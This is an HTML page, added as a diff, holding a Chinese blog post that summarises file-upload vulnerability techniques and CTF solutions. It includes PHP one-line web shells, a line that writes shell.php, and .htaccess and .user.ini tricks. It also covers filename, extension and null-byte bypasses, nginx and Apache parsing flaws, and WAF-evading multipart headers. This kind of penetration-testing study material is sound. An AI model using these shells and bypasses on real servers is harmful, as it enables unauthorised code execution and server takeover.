@@ -1,0 +1,498 @@
+<head>
+<script src="https://cdn.jsdelivr.net/npm/jquery/dist/jquery.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css">
+<script src="https://cdn.jsdelivr.net/gh/stevenjoezhang/live2d-widget/autoload.js"></script>
+</head>
+
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+<head>
+    <!--Setting-->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
+    <meta http-equiv="Cache-Control" content="no-transform">
+    <meta name="renderer" content="webkit|ie-comp|ie-stand">
+    <meta name="apple-mobile-web-app-capable" content="ggy的个人博客">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="format-detection" content="telephone=no,email=no,adress=no">
+    <meta name="browsermode" content="application">
+    <meta name="screen-orientation" content="portrait">
+    <meta name="theme-version" content="1.2.3">
+    <meta name="root" content="/">
+    <link rel="dns-prefetch" href="https://ggyggy666.github.io">
+    <!--SEO-->
+
+<meta name="keywords" content="文件上传漏洞总结" />
+
+
+<meta name="description" content="生产实习终于结束了，今天总结一下文件上传漏洞。
+
+
+文件上传功能很常见，但是过滤也挺严格的。至今为止，我还未尝在实战中发现一个。因此总结一下一些姿势，希望对日后有所帮助。
+原理文件上传漏洞，即在..." />
+
+
+<meta name="robots" content="all" />
+<meta name="google" content="all" />
+<meta name="googlebot" content="all" />
+<meta name="verify" content="all" />
+    <!--Title-->
+
+<title>
+    
+    文件上传漏洞总结 |
+    
+    ggy的个人博客
+</title>
+
+<link rel="alternate" href="/atom.xml" title="ggy的个人博客" type="application/atom+xml">
+
+
+<link rel="icon" href="/favicon.ico">
+
+    
+
+
+<link rel="stylesheet" href="/css/bootstrap.min.css?rev=3.3.7.css">
+<link rel="stylesheet" href="/css/font-awesome.min.css?rev=4.7.0.css">
+<link rel="stylesheet" href="/css/style.css?rev=@@hash.css">
+
+    
+<div class="hide">
+    <script type="text/javascript">
+    var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");
+    document.write(unescape("%3Cspan class='cnzz_stat_icon_1263868967 hide' %3E%3Cscript%20src%3D%22https%3A%2F%2Fs95.cnzz.com%2Fz_stat.php%3Fweb_id%3D1272564536%22%3E%3C%2Fscript%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s19.cnzz.com/z_stat.php%3Fid%3D1263868967%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));
+    </script>
+</div>
+
+
+
+
+    
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+<!--[if lte IE 8]>
+<style>
+    html{ font-size: 1em }
+</style>
+<![endif]-->
+<!--[if lte IE 9]>
+<div style="ie">你使用的浏览器版本过低，为了你更好的阅读体验，请更新浏览器的版本或者使用其他现代浏览器，比如Chrome、Firefox、Safari等。</div>
+<![endif]-->
+<body>
+    <header class="main-header"  style="background-image:url(
+    https://pic.downk.cc/item/5e3816b82fb38b8c3c8791f9.jpg)"
+     >
+    <div class="main-header-box">
+        <a class="header-avatar" href="/" title='ggy'>
+            <img src="/img/avatar.jpg" alt="logo头像" class="img-responsive center-block">
+        </a>
+        <div class="branding">
+            <!--<h2 class="text-hide">Snippet主题,从未如此简单有趣</h2>-->
+            
+            <h2>
+                欢迎来到ggy的个人网站
+            </h2>
+            
+        </div>
+    </div>
+</header>
+    <nav class="main-navigation">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="navbar-header"><span class="nav-toggle-button collapsed pull-right" data-toggle="collapse" data-target="#main-menu" id="mnav">
+                        <span class="sr-only"></span>
+                        <i class="fa fa-bars"></i>
+                    </span>
+                    <a class="navbar-brand" href="https://ggyggy666.github.io">
+                        ggy的个人博客</a>
+                </div>
+                <div class="collapse navbar-collapse" id="main-menu">
+                    <ul class="menu">
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/"><i class="fa "></i>
+                                首页</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/categories/web安全/"><i class="fa "></i>
+                                web安全</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/categories/python工具/"><i class="fa "></i>
+                                python工具</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/categories/密码学/"><i class="fa "></i>
+                                密码学</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/archives/"><i class="fa "></i>
+                                时间轴</a>
+                        </li>
+                        
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+</nav>
+    <section class="content-wrap">
+        <div class="container">
+            <div class="row">
+                <main class="col-md-8 main-content m-post">
+                    <p id="process"></p>
+<article class="post">
+    <div class="post-head">
+        <h1 id="文件上传漏洞总结">
+            
+            文件上传漏洞总结
+            
+        </h1>
+        <div class="post-meta">
+    
+    <span class="categories-meta fa-wrap">
+        <i class="fa fa-folder-open-o"></i>
+        <a class="category-link" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a>
+    </span>
+    
+    
+    <span class="fa-wrap">
+        <i class="fa fa-tags"></i>
+        <span class="tags-meta">
+            
+            <a class="tag-link" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" rel="tag">文件上传漏洞总结</a>
+            
+        </span>
+    </span>
+    
+    
+    
+    <span class="fa-wrap">
+        <i class="fa fa-clock-o"></i>
+        <span class="date-meta">
+            2020/07/13</span>
+    </span>
+    
+    <span class="fa-wrap">
+        <i class="fa fa-eye"></i>
+        <span id="busuanzi_value_page_pv"></span>
+    </span>
+    
+    
+</div>
+        
+        
+    </div>
+    
+    <div class="post-body post-content">
+        <p>生产实习终于结束了，今天总结一下文件上传漏洞。</p>
+<a id="more"></a>
+
+<p>文件上传功能很常见，但是过滤也挺严格的。至今为止，我还未尝在实战中发现一个。因此总结一下一些姿势，希望对日后有所帮助。</p>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>文件上传漏洞，即在一个可上传文件的地方，对上传的文件没有什么过滤或者过滤不严格，导致上传了包含有恶意代码的文件并且被成功执行从而获取了服务器权限。</p>
+<h2 id="常见检验点"><a href="#常见检验点" class="headerlink" title="常见检验点"></a>常见检验点</h2><ul>
+<li>客户端js校验</li>
+<li>上传的文件后缀校验</li>
+<li>上传的文件类型校验</li>
+<li>上传的文件头校验</li>
+<li>上传的文件内容校验</li>
+</ul>
+<h2 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h2><p>查看PHP信息，检测是否上传成功并执行PHP代码：</p>
+<p><code>&lt;?php phpinfo();?&gt;</code></p>
+<p>成功后，再上传能被蚁剑连接的文件，内容为：</p>
+<p><code>&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;</code></p>
+<p>使用蚁剑连接，密码就是cmd。</p>
+<h2 id="常见漏洞绕过情形"><a href="#常见漏洞绕过情形" class="headerlink" title="常见漏洞绕过情形"></a>常见漏洞绕过情形</h2><ol>
+<li><p>JS绕过</p>
+<p>客户端验证了上传文件后缀，可以在firebug中修改前端代码，添加允许的上传类型，或者直接禁用JS。还可以将PHP文件改成允许是文件名后缀，上传同时抓包，再修改回PHP。</p>
+</li>
+<li><p>文件类型绕过</p>
+<p>将Content-Type修改为允许的文件类型，如：image/jpg, image/jpeg, image/png……</p>
+</li>
+<li><p>后缀名绕过</p>
+<p>尝试不同的后缀名，比如大小写，html | htm | phtml | php | php2 | hph3 | php4 | php5 | asp | aspx | ascx | jsp | cfm | cfc | bat | exe | com | dll | vbs | js | reg | cgi | htaccess | asis | sh |phtm | shtm |inc等。</p>
+<p>IIS默认解析：.asp | .cdx | .asa | .cer</p>
+</li>
+<li><p>上传.htacess文件绕过</p>
+<p>如果没有限制.htacess文件，可先上传，其内容为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .jpg</span><br></pre></td></tr></table></figure>
+
+<p>该代码意思是，将.jpg结尾的文件当成PHP文件来解析。因此上传了.htaccess文件后，再上传a.jpg文件。</p>
+<p>apache就上传.htacess文件，如果是nginx，就上传.user.ini。具体看后面的CTF题目。</p>
+</li>
+<li><p>利用PHP和windows的特性绕过</p>
+<p>先上传一个文件：4.php:.jpg ,会生成一个空的4.php文件。然后再次上传，将文件名修改成：<strong>4.&lt;</strong> 或 <strong>4.&lt;&lt;&lt;</strong> 或 <strong>4.&gt;&gt;&gt;</strong> 或 <strong>4.&gt;&gt;&lt;</strong>，再次上传，就可以将PHP代码写入4.php文件中。</p>
+</li>
+<li><p>空格绕过</p>
+<p>文件名为：6.php （php后有空格)</p>
+</li>
+<li><p>点绕过</p>
+<p>文件名为：7.php.</p>
+</li>
+<li><p>::$DATA文件流特性绕过</p>
+<p>文件名：8.php::$DATA</p>
+</li>
+<li><p>点+空格+点绕过</p>
+<p>文件名：9.php. .</p>
+</li>
+<li><p>双写文件名绕过</p>
+<p>文件名：10.pphphp</p>
+</li>
+<li><p>文件路径%00绕过</p>
+<p>抓包看到上传的包中，头部有上传的路径，如：<code>?path=/upload</code>,那么可以改为：<code>?path=/upload/11.php%00</code>, 然后上传的文件名还是11.jpg。最后保存的可能就是11.php了。如果路径不在头部，而是在文件名位置的上方，那么可以在11.php的后面加个空格，然后hex中将空格代表的20修改为00.</p>
+</li>
+<li><p>绕过文件头检测</p>
+<ul>
+<li>GIF: GIF89a（47 49 46 38 39 61）</li>
+<li>jpg:  FF D8 FE E0 00 10 4A 46 49 46</li>
+<li>png:  89 50 4E 47</li>
+</ul>
+<p>例如：<code>GIF89a&lt;?php eval($_POST[&#39;test&#39;]); ?&gt;</code>。</p>
+</li>
+<li><p>二次渲染绕过</p>
+<p>上传图片后，再下载图片，将它与原来的图片进行对比，查看相同的地方，在那个地方插入PHP代码。</p>
+<p><a href="https://blog.csdn.net/qq_41079177/article/details/89386741" target="_blank" rel="noopener">二次渲染</a> </p>
+</li>
+<li><p>条件竞争上传。</p>
+<p>上传的文件很快就被删除，利用条件竞争绕过。使用burp的intruder模块，一直爆破发包上传文件，直到删除速度小于上传速度。</p>
+</li>
+<li><p>条件竞争+Apache解析漏洞</p>
+<p>当上传的文件被重命名后，同样尝试条件竞争。如果存在Apache解析漏洞，那么可以上传1.php.7z的文件，然后intruder中不停上传，最后使用解析漏洞访问。利用解析漏洞还可以通关%0a换行符。在burp的hex中在1.php后面加一个0a，然后访问：xxx/1.php%0a。</p>
+<p><a href="https://www.leavesongs.com/PENETRATION/apache-cve-2017-15715-vulnerability.html" target="_blank" rel="noopener">CVE-2017-15715</a> </p>
+<p>条件竞争还可以通过上传的文件内容是写入一个文件来访问那个文件。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	fputs(fopen(&#39;..&#x2F;shell.php&#39;, &#39;w&#39;),&#39;&lt;?php @eval($_POST[a])?&gt;&#39;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ol>
+<ol start="16">
+<li><p>0x00截断让</p>
+<p>文件名为：1.php .jpg, 然后在hex中将php与.jpg之间的空格改为00即可。</p>
+</li>
+<li><p>配合文件包含漏洞</p>
+<p>首先上传一个txt文件，其内容为一句话木马。然后在文件包含漏洞处引用那个文件名。如果不存在文件包含漏洞，但是可以上传PHP后缀的文件，只是检测了文件内容，那么可以上传一个PHP文件去包含那个txt文件。如：<code>&lt;?php include(&quot;txt文件路径&quot;);?&gt;</code>。</p>
+</li>
+</ol>
+<h2 id="nginx解析漏洞"><a href="#nginx解析漏洞" class="headerlink" title="nginx解析漏洞"></a>nginx解析漏洞</h2><p>nginx解析漏洞造成的原因在于将.php结尾的文件交给fastcgi处理，而当文件不存在时，php.ini配置文件中有一个cgi.fix_pathinfo=1, 导致当前文件不存在时就处理上层路径文件。最重要一点，php-fpm.conf中存在security.limit_extensions，它配置了fastcgi解析的类型，如果它的值为空，就会将jpg等图片文件当成PHP代码执行。因此，可以上传一个test.jpg文件，其内容为一句话木马，然后访问：xxx/test.jpg/test.php，由于test.php文件不存在，向上一级处理，即处理test.jpg，然后将test.jpg当成代码执行，从而成功上传恶意文件。</p>
+<p><a href="http://www.whalwl.top:8020/" target="_blank" rel="noopener">题目</a> </p>
+<p>防御很简单，设置：security.limit_extensions=.php，只允许解析PHP文件即可。</p>
+<h2 id="图片木马制作"><a href="#图片木马制作" class="headerlink" title="图片木马制作"></a>图片木马制作</h2><p>将一个php文件和jpg文件放在同一个目录下，打开命令行，cd到那个目录，敲命令：<code>copy /b 1.jpg+1.php</code> 或者  <code>copy 1.jpg/b + 2.php /a test.jpg</code>。</p>
+<h2 id="waf绕过"><a href="#waf绕过" class="headerlink" title="waf绕过"></a>waf绕过</h2><ul>
+<li><p>有些waf只校验一定大小的内容，那么可以构造一个大文件，前面都是垃圾内容，后面才是木马。</p>
+</li>
+<li><p>可以尝试多加一个<code>filename=&quot;xxx.php&quot;</code>。</p>
+</li>
+<li><p>在Content-Disposition中，尝试调换一下filename和name的位置。</p>
+</li>
+<li><p>尝试去掉双引号，如：<code>filename=xxx.php</code>, 或者将双引号变成单引号，如：<code>filename=&#39;xxx.php&#39;</code>。</p>
+</li>
+<li><p>在Content-Disposition中，尝试去掉form-data。</p>
+</li>
+<li><p>尝试增加一个boundary。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundaryj1oRYFW91eaj8Ex2</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;file_x&quot;; filename&#x3D;&quot;test.txt&quot;</span><br><span class="line">Content-Type: text&#x2F;javascript</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryj1oRYFW91eaj8Ex2</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;file_x&quot;; filename&#x3D;&quot;test.php&quot;</span><br><span class="line">Content-Type: text&#x2F;javascript</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>尝试多个分号。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;file_x&quot;;;; filename&#x3D;&quot;test.php&quot;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>在boundary前添加任意字符（支持PHP）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: multipart&#x2F;form-data; bypassboundary&#x3D;----WebKitFormBoundaryj1oRYFW91eaj8Ex2</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>用换行拆分filename</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;file_x&quot;; file</span><br><span class="line">name&#x3D;&quot;test.php&quot;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>name和filename之间添加任意字符串</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: name&#x3D;&quot;file_x&quot;; bypass waf upload; filename&#x3D;&quot;test.php&quot;;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>尝试将POST请求修改为GET请求。</p>
+</li>
+</ul>
+<h2 id="典型套路"><a href="#典型套路" class="headerlink" title="典型套路"></a>典型套路</h2><p><img src="https://pic.downk.cc/item/5f0d5efc14195aa594cf896f.jpg" alt></p>
+<h2 id="CTF题目"><a href="#CTF题目" class="headerlink" title="CTF题目"></a>CTF题目</h2><p><img src="https://pic.downk.cc/item/5f0d5e7e14195aa594cf5968.jpg" alt></p>
+<p>首先更改Content-type为image/jpg，不行就观察文件名为1.php和1.jpg，二者结果不一，那么判断存在黑名单。还要增加图片头：GIF89a。上传文件名改成.user.ini，如果上传成功，说明允许。因此可以先上传一个带有一句话木马的test.jpg文件，发现检测到了&lt;?，因此不能用常见的一句话，使用<code>&lt;script language=&quot;PHP&quot;&gt;system($_GET[&#39;id&#39;])&lt;/script&gt;</code>。然后再上传.user.ini，它的内容为：<code>php_value auto_prepend_file=test.jpg</code>。再访问<code>上传得到的路径/index.php?id=whoami</code>即可。</p>
+<p><strong>网鼎杯某题</strong></p>
+<p><img src="https://pic.downk.cc/item/5f0d5eb614195aa594cf7008.jpg" alt> </p>
+<p>该题中，对上传的filename进行一个数组分割，因此可以增加多个boundary。而且使用reset函数获取第一个元素作为文件名字，因此filename[0]放在首位，值为shell；使用end函数来判断文件名后缀是否是jpg等从而绕过黑名单，因此使用filename[6]作为最后一个元素，其值为jpg，绕过黑名单；使用了count函数来计算文件后缀名的长度再减1作为文件名数组的下标，而php长度为3，在数组中下标从0开始，因此需要使用filename[2]。可惜这环境好像有点问题。</p>
+<p><strong>参考文章</strong></p>
+<p><a href="https://bbs.ichunqiu.com/thread-46066-1-31.html" target="_blank" rel="noopener">绕过姿势</a></p>
+<p><a href="https://blog.csdn.net/weixin_43724919/article/details/106521444" target="_blank" rel="noopener">upload-labs通关记录</a> </p>
+
+    </div>
+    
+    <div class="reward" ontouchstart>
+    <div class="reward-wrap">赏
+        <div class="reward-box">
+            
+            <span class="reward-type">
+                <img class="alipay" src="/img/alipay.jpg"><b>支付宝打赏</b>
+            </span>
+            
+            
+            <span class="reward-type">
+                <img class="wechat" src="/img/wechat.jpg"><b>微信打赏</b>
+            </span>
+            
+        </div>
+    </div>
+    <p class="reward-tip">
+        赞赏是不耍流氓的鼓励
+    </p>
+</div>
+    
+    <div class="post-footer">
+        <div>
+            
+            转载声明：
+            商业转载请联系作者获得授权,非商业转载请注明出处 © <a href="ggy.44pp.vip" target="_blank">ggy</a>
+            
+            
+        </div>
+        <div>
+            
+        </div>
+    </div>
+</article>
+<div class="article-nav prev-next-wrap clearfix">
+    
+    <a href="/2020/07/14/xxe%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" class="pre-post btn btn-default" title='xxe漏洞总结'>
+        <i class="fa fa-angle-left fa-fw"></i><span class="hidden-lg">上一篇</span>
+        <span class="hidden-xs">
+            xxe漏洞总结</span>
+    </a>
+    
+    
+    <a href="/2020/06/25/CSRF%E7%9A%84%E5%B8%B8%E8%A7%81%E6%83%85%E5%86%B5%E5%8F%8A%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/" class="next-post btn btn-default" title='CSRF的常见情况及绕过姿势'>
+        <span class="hidden-lg">下一篇</span>
+        <span class="hidden-xs">
+            CSRF的常见情况及绕过姿势</span><i class="fa fa-angle-right fa-fw"></i>
+    </a>
+    
+</div>
+
+<div id="comments">
+    
+<div id="lv-container" data-id="city" data-uid="MTAyMC80ODM1Ni8yNDg1MA==">
+    <script type="text/javascript">
+    (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+    })(document, 'script');
+    </script>
+</div>
+
+</div>
+
+                </main>
+                
+                    <aside id="article-toc" role="navigation" class="col-md-4">
+    <div class="widget">
+        <h3 class="title">
+            文章目录
+        </h3>
+        
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#原理"><span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#常见检验点"><span class="toc-text">常见检验点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#一句话木马"><span class="toc-text">一句话木马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#常见漏洞绕过情形"><span class="toc-text">常见漏洞绕过情形</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#nginx解析漏洞"><span class="toc-text">nginx解析漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#图片木马制作"><span class="toc-text">图片木马制作</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#waf绕过"><span class="toc-text">waf绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#典型套路"><span class="toc-text">典型套路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CTF题目"><span class="toc-text">CTF题目</span></a></li></ol>
+        
+    </div>
+</aside>
+                
+            </div>
+        </div>
+    </section>
+    <footer class="main-footer">
+    <div class="container">
+        <div class="row">
+        </div>
+    </div>
+</footer>
+<a id="back-to-top" class="icon-btn hide">
+    <i class="fa fa-chevron-up"></i>
+</a>
+    <div class="copyright">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="busuanzi">
+    
+    访问量:
+    <strong id="busuanzi_value_site_pv">
+        <i class="fa fa-spinner fa-spin"></i>
+    </strong>
+    &nbsp; | &nbsp;
+    访客数:
+    <strong id="busuanzi_value_site_uv">
+        <i class="fa fa-spinner fa-spin"></i>
+    </strong>
+    
+</div>
+            </div>
+            <div class="col-sm-12">
+                <span>Copyright &copy;
+                    2020
+                    
+                </span> |
+                <span>
+                    Powered by <a href="//hexo.io" class="copyright-links" target="_blank" rel="nofollow">Hexo</a>
+                </span> |
+                <span>
+                    Theme by <a href="//github.com/shenliyang/hexo-theme-snippet.git" class="copyright-links" target="_blank" rel="nofollow">Snippet</a>
+                </span>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<script src="/assets/tagcanvas.min.js?rev=2.9.js"></script>
+
+<script>
+var tagOption = {
+    textColour: '#444', // 字体颜色
+    outlineMethod: 'block', // 选中模式
+    outlineColour: '#FFDAB9', // 选中模式的颜色
+    interval: 30 || 30, // 动画帧之间的时间间隔，值越大，转动幅度越大
+    textHeight: 13,
+    outlineRadius: 3,
+    freezeActive: true || '', // 选中的标签是否继续滚动
+    frontSelect: true || '', // 不选标签云后部的标签
+    initial: [0.1, -0.1],
+    depth: 0.5,
+    decel: 0.95,
+    maxSpeed: 0.03,
+    reverse: true || '', // 是否反向触发
+    fadeIn: 500, // 进入动画时间
+    wheelZoom: false || '' // 是否启用鼠标滚轮
+}
+TagCanvas.Start('tag-cloud-3d', '', tagOption);
+</script>
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+<script src="/js/app.js?rev=@@hash.js"></script>
+
+
+<!-- 雪花特效 -->
+<script type="text/javascript" src="http://libs.baidu.com/jquery/1.8.3/jquery.js"></script>
+<script type="text/javascript" src="http://libs.baidu.com/jquery/1.8.3/jquery.min.js"></script>
+<script type="text/javascript" src="\js\snow.js"></script>
+
+<canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+<script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+<script type="text/javascript" src="/js/fireworks.js"></script>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"live2d-widget-model-haruto"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
